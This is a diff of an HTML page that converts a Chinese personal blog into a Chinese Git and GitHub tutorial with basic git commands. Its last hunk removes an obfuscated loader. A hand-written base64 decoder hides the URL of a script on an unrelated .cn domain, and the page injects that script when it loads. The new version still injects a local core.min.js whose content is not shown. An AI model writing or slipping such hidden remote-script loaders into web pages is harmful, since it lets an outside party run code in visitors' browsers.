@@ -3,8 +3,9 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>我的灵感画廊</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>Git & GitHub 协作指南</title>
     <style>
         /* 全局样式 */
         body {
@@ -12,10 +13,10 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #FDFDFD;
-            /* 纯净的浅色背景 */
-            color: #333333;
-            /* 深灰色文本 */
+            background-color: #F8FBFD;
+            /* 浅蓝灰色背景 */
+            color: #343A40;
+            /* 深炭灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -39,8 +40,8 @@
         }
 
         header h1 {
-            color: #2C5F2D;
-            /* 强调色：深绿色标题 */
+            color: #2C3E50;
+            /* 深蓝灰色标题 */
             font-size: 2.5em;
             margin-bottom: 10px;
             letter-spacing: 0.5px;
@@ -53,36 +54,41 @@
             margin: 0;
         }
 
-        /* 导航菜单 */
-        nav ul {
+        /* 导航菜单 - 顶部固定 */
+        .main-nav {
+            position: sticky;
+            top: 0;
+            background-color: #FFFFFF;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            z-index: 999;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            overflow: hidden;
+        }
+
+        .main-nav ul {
             list-style: none;
             padding: 0;
-            margin-top: 25px;
+            margin: 0;
             display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 10px 0;
         }
 
-        nav ul li {
-            margin: 0 10px 10px 10px;
-        }
-
-        nav ul li a {
+        .main-nav ul li a {
             text-decoration: none;
-            color: #4CAF50;
-            /* 强调色：绿色 */
+            color: #3498DB;
+            /* 强调色：蓝色 */
             font-weight: bold;
-            padding: 10px 18px;
-            border-radius: 25px;
-            /* 药丸形按钮 */
-            border: 1px solid #4CAF50;
-            transition: all 0.3s ease;
+            padding: 10px 15px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease, color 0.3s ease;
         }
 
-        nav ul li a:hover {
-            background-color: #4CAF50;
-            color: #FFFFFF;
-            box-shadow: 0 4px 10px rgba(76, 175, 80, 0.3);
+        .main-nav ul li a:hover {
+            background-color: #E0EBF5;
+            /* 浅蓝色背景 */
+            color: #2980B9;
         }
 
         /* 主要内容区 */
@@ -90,79 +96,7 @@
             padding-top: 0;
         }
 
-        .articles-grid-container {
-            column-count: 1;
-            /* 默认单列 */
-            column-gap: 20px;
-        }
-
-        .article-card {
-            background-color: #FFFFFF;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-            margin-bottom: 20px;
-            /* 卡片之间的垂直间距 */
-            break-inside: avoid;
-            /* 防止卡片在列之间断开 */
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            overflow: hidden;
-            /* 确保内容不溢出 */
-        }
-
-        .article-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
-        }
-
-        .article-card h3 {
-            color: #2C5F2D;
-            /* 标题颜色 */
-            font-size: 1.4em;
-            margin-bottom: 8px;
-        }
-
-        .article-card .date {
-            color: #777777;
-            font-size: 0.9em;
-            margin-bottom: 15px;
-            display: block;
-        }
-
-        .article-card img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 10px;
-            margin-top: 15px;
-            margin-bottom: 15px;
-            display: block;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-        }
-
-        .article-card p {
-            color: #4A4A4A;
-            font-size: 1em;
-            margin-bottom: 18px;
-        }
-
-        .article-card .read-more {
-            display: inline-block;
-            background-color: #4CAF50;
-            color: #FFFFFF;
-            padding: 10px 20px;
-            border-radius: 20px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-        }
-
-        .article-card .read-more:hover {
-            background-color: #43A047;
-            transform: scale(1.05);
-        }
-
-        /* 关于我/联系区 */
-        section {
+        .section-card {
             background-color: #FFFFFF;
             padding: 25px;
             border-radius: 15px;
@@ -170,8 +104,8 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
         }
 
-        section h2 {
-            color: #2C5F2D;
+        h2 {
+            color: #2C3E50;
             font-size: 1.8em;
             margin-bottom: 25px;
             border-bottom: 2px solid #E0EBF5;
@@ -179,40 +113,108 @@
             text-align: center;
         }
 
-        section p {
-            color: #4A4A4A;
+        h3 {
+            color: #343A40;
+            font-size: 1.3em;
+            margin-top: 20px;
             margin-bottom: 15px;
         }
 
-        section a {
-            color: #4CAF50;
-            text-decoration: none;
-            font-weight: bold;
-            transition: color 0.3s ease;
+        p {
+            color: #495057;
+            font-size: 1em;
+            margin-bottom: 18px;
         }
 
-        section a:hover {
-            color: #43A047;
-        }
-
-        /* 社交链接 */
-        .social-links {
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
             margin-top: 20px;
+            margin-bottom: 20px;
+            display: block;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        /* 分类步骤布局 */
+        .category-section {
+            margin-bottom: 40px;
+        }
+
+        .category-section h3 {
+            background-color: #3498DB;
+            /* 强调色背景 */
+            color: #FFFFFF;
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
             text-align: center;
+            font-size: 1.5em;
+            box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3);
         }
 
-        .social-links a {
-            display: inline-block;
-            margin: 0 10px;
-            color: #4CAF50;
-            font-size: 2em;
-            text-decoration: none;
-            transition: transform 0.3s ease;
+        .step-item {
+            background-color: #FDFDFD;
+            /* 步骤项背景 */
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        .social-links a:hover {
+        .step-item:hover {
             transform: translateY(-3px);
-            color: #43A047;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .step-item h4 {
+            color: #343A40;
+            font-size: 1.2em;
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        .step-item .step-number {
+            display: inline-block;
+            background-color: #2ECC71;
+            /* 绿色强调色 */
+            color: #FFFFFF;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 30px;
+            font-weight: bold;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+
+        .step-item .step-title-wrapper {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        /* 代码块样式 */
+        pre {
+            background-color: #2D3E50;
+            /* 深色背景 */
+            color: #EAECEE;
+            /* 浅色文本 */
+            padding: 18px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
+            font-size: 0.9em;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        code {
+            font-family: inherit;
+            font-size: inherit;
         }
 
         /* 页脚样式 */
@@ -228,111 +230,190 @@
             box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
         }
 
-        /* 媒体查询：平板及以上设备，实现多列瀑布流 */
-        @media (min-width: 600px) {
-            .articles-grid-container {
-                column-count: 2;
-                /* 两列布局 */
-            }
+        .footer-links a {
+            color: #3498DB;
+            text-decoration: none;
+            margin: 0 8px;
+            font-weight: bold;
+            transition: color 0.3s ease;
         }
 
-        @media (min-width: 900px) {
-            .articles-grid-container {
-                column-count: 3;
-                /* 三列布局 */
-            }
+        .footer-links a:hover {
+            color: #2980B9;
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <div class="container">
         <header>
-            <h1>我的灵感画廊</h1>
-            <p>用文字和图像捕捉生活中的美好瞬间</p>
-            <nav>
-                <ul>
-                    <li><a href="#latest-articles">最新</a></li>
-                    <li><a href="#about">关于</a></li>
-                    <li><a href="#contact">联系</a></li>
-                </ul>
-            </nav>
+            <h1>Git & GitHub 协作指南</h1>
+            <p>从基础到高级，掌握版本控制与团队协作</p>
         </header>
 
+        <nav class="main-nav">
+            <ul>
+                <li><a href="#git-basics">Git基础</a></li>
+                <li><a href="#github-collaboration">GitHub协作</a></li>
+                <li><a href="#advanced-topics">高级主题</a></li>
+            </ul>
+        </nav>
+
         <main>
-            <section id="latest-articles">
-                <h2>最新分享</h2>
-                <div class="articles-grid-container">
-                    <!-- 文章一 -->
-                    <article class="article-card">
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="日出时的山景">
-                        <h3>清晨的徒步与内心的平静</h3>
-                        <span class="date">发布日期：2023年7月30日</span>
-                        <p>最近一次清晨的徒步，让我感受到了大自然的神奇力量。阳光穿透树林，露珠在叶片上闪耀，一切都那么宁静而美好。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </article>
-                    <!-- 文章二 -->
-                    <article class="article-card">
-                        <img src="https://picsum.photos/300/250?random=<%= new Date().getTime() + 2 %>" alt="手冲咖啡器具">
-                        <h3>手冲咖啡的艺术与哲学</h3>
-                        <span class="date">发布日期：2023年7月28日</span>
-                        <p>手冲咖啡不仅仅是制作饮品，更是一种仪式，一种对生活品质的追求。从磨豆到注水，每一步都蕴含着独特的哲学。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </article>
-                    <!-- 文章三 -->
-                    <article class="article-card">
-                        <img src="https://picsum.photos/300/180?random=<%= new Date().getTime() + 3 %>" alt="一本打开的书和眼镜">
-                        <h3>沉浸式阅读：如何让知识深入人心</h3>
-                        <span class="date">发布日期：2023年7月25日</span>
-                        <p>在信息爆炸的时代，如何才能真正沉下心来阅读？分享我的沉浸式阅读技巧，让你更好地吸收知识。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </article>
-                    <!-- 文章四 -->
-                    <article class="article-card">
-                        <img src="https://picsum.photos/300/220?random=<%= new Date().getTime() + 4 %>" alt="城市夜景中的灯光">
-                        <h3>城市夜景：光影交织的魅力</h3>
-                        <span class="date">发布日期：2023年7月22日</span>
-                        <p>夜晚的城市，灯火辉煌，流光溢彩。用镜头记录下这座城市独特的夜间魅力，感受光影的变幻。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </article>
-                    <!-- 文章五 -->
-                    <article class="article-card">
-                        <img src="https://picsum.photos/300/190?random=<%= new Date().getTime() + 5 %>" alt="植物特写">
-                        <h3>室内绿植：为生活空间增添生机</h3>
-                        <span class="date">发布日期：2023年7月20日</span>
-                        <p>在家中摆放一些绿植，不仅能净化空气，还能为生活空间带来一份宁静与活力。分享几种适合室内种植的植物。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </article>
-                    <!-- 文章六 -->
-                    <article class="article-card">
-                        <img src="https://picsum.photos/300/210?random=<%= new Date().getTime() + 6 %>" alt="笔记本电脑和代码">
-                        <h3>我的编程学习之路：从小白到入门</h3>
-                        <span class="date">发布日期：2023年7月18日</span>
-                        <p>记录下我学习编程的初期经历，遇到的挑战与收获。希望我的经验能给正在学习编程的朋友们一些启发。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </article>
+            <section id="git-basics" class="section-card category-section">
+                <h2>Git基础入门</h2>
+                <h3>1. Git安装与配置</h3>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">1</span>
+                        <h4>下载并安装Git</h4>
+                    </div>
+                    <p>访问Git官网下载适合您操作系统的安装包，并按照提示完成安装。</p>
+                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="Git下载页面截图">
+                </div>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">2</span>
+                        <h4>配置用户信息</h4>
+                    </div>
+                    <p>安装完成后，需要配置您的用户名和邮箱，这将用于标识您的提交。</p>
+                    <pre><code>
+git config --global user.name "Your Name"
+git config --global user.email "your_email@example.com"
+                    </code></pre>
+                </div>
+
+                <h3>2. 基本Git操作</h3>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">1</span>
+                        <h4>初始化仓库</h4>
+                    </div>
+                    <p>在项目文件夹中执行以下命令，初始化一个新的Git仓库。</p>
+                    <pre><code>
+git init
+                    </code></pre>
+                </div>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">2</span>
+                        <h4>添加与提交文件</h4>
+                    </div>
+                    <p>将文件添加到暂存区，然后提交到本地仓库。</p>
+                    <pre><code>
+git add .
+git commit -m "Initial commit"
+                    </code></pre>
+                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="Git命令行操作截图">
                 </div>
             </section>
 
-            <section id="about">
-                <h2>关于我</h2>
-                <p>你好！我是一个热爱生活、喜欢探索和分享的创作者。这个博客是我记录个人成长、兴趣爱好和对世界看法的平台。</p>
-                <p>我相信文字和图像能够连接彼此，希望我的分享能为你带来一些灵感和快乐！</p>
+            <section id="github-collaboration" class="section-card category-section">
+                <h2>GitHub团队协作</h2>
+                <h3>1. 远程仓库操作</h3>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">1</span>
+                        <h4>创建GitHub仓库</h4>
+                    </div>
+                    <p>在GitHub上创建一个新的空仓库。</p>
+                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="GitHub创建仓库页面">
+                </div>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">2</span>
+                        <h4>关联本地与远程仓库</h4>
+                    </div>
+                    <p>将本地仓库与GitHub上的远程仓库关联起来。</p>
+                    <pre><code>
+git remote add origin https://github.com/your-username/your-repo.git
+                    </code></pre>
+                </div>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">3</span>
+                        <h4>推送代码</h4>
+                    </div>
+                    <p>将本地代码推送到远程仓库。</p>
+                    <pre><code>
+git push -u origin main
+                    </code></pre>
+                </div>
+
+                <h3>2. 协作流程</h3>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">1</span>
+                        <h4>克隆远程仓库</h4>
+                    </div>
+                    <p>团队成员通过克隆远程仓库来获取项目代码。</p>
+                    <pre><code>
+git clone https://github.com/your-username/your-repo.git
+                    </code></pre>
+                </div>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">2</span>
+                        <h4>创建与切换分支</h4>
+                    </div>
+                    <p>在开发新功能或修复bug时，通常会创建新的分支。</p>
+                    <pre><code>
+git branch feature/new-feature
+git checkout feature/new-feature
+                    </code></pre>
+                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="Git分支示意图">
+                </div>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">3</span>
+                        <h4>合并分支与解决冲突</h4>
+                    </div>
+                    <p>完成开发后，将分支合并到主分支，并解决可能出现的冲突。</p>
+                    <pre><code>
+git checkout main
+git merge feature/new-feature
+                    </code></pre>
+                </div>
             </section>
 
-            <section id="contact">
-                <h2>联系方式</h2>
-                <div class="social-links">
-                    <a href="#" aria-label="GitHub">GitHub</a> |
-                    <a href="#" aria-label="Twitter">Twitter</a> |
-                    <a href="#" aria-label="LinkedIn">LinkedIn</a>
+            <section id="advanced-topics" class="section-card category-section">
+                <h2>高级Git主题</h2>
+                <h3>1. Git Rebase</h3>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">1</span>
+                        <h4>理解Rebase</h4>
+                    </div>
+                    <p><code>git rebase</code> 命令用于将一个分支的修改应用到另一个分支上，通常用于保持提交历史的整洁。</p>
+                    <pre><code>
+git checkout feature-branch
+git rebase main
+                    </code></pre>
+                </div>
+
+                <h3>2. Git Stash</h3>
+                <div class="step-item">
+                    <div class="step-title-wrapper">
+                        <span class="step-number">1</span>
+                        <h4>暂存工作区修改</h4>
+                    </div>
+                    <p>当你需要切换分支但不想提交当前工作区的修改时，可以使用 <code>git stash</code> 暂存。</p>
+                    <pre><code>
+git stash save "Work in progress"
+                    </code></pre>
+                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 5 %>" alt="Git Stash示意图">
                 </div>
             </section>
         </main>
 
         <footer>
-            <p>&copy; 2023 我的灵感画廊. All rights reserved.</p>
+            <p>&copy; 2023 Git & GitHub 协作指南. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#" aria-label="GitHub">GitHub</a> |
+                <a href="#" aria-label="Git官网">Git官网</a> |
+                <a href="#" aria-label="联系我们">联系我们</a>
+            </div>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -347,14 +428,15 @@
 
     <script>
         // 平滑滚动到锚点
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        document.querySelectorAll('.main-nav a[href^="#"]').forEach(anchor => {
             anchor.addEventListener('click', function (e) {
                 e.preventDefault();
                 const targetId = this.getAttribute('href');
                 const targetElement = document.querySelector(targetId);
                 if (targetElement) {
+                    const navHeight = document.querySelector('.main-nav').offsetHeight;
                     window.scrollTo({
-                        top: targetElement.offsetTop - 20, /* 稍微向上偏移，避免顶部遮挡 */
+                        top: targetElement.offsetTop - navHeight - 20, /* 额外20px间距 */
                         behavior: 'smooth'
                     });
                 }
@@ -376,53 +458,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9wNG82aTh1Lm13Z3hzei5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
